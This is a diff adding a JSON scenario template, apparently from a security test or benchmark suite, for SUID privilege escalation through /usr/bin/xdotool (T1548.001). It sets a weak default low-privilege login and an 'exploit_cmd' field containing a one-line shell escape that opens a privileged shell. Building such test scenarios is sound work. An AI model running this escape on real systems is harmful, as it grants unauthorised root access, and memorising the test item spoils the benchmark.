@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_001_suid_xdotool",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "SUID bit set on /usr/bin/xdotool allows privilege escalation via shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "single_command",
+  "dedup_group": "suid_shell_escape",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_001_suid_xdotool",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "xdotool exec --sync /bin/sh -p",
+  "binary_path": "/usr/bin/xdotool"
+}
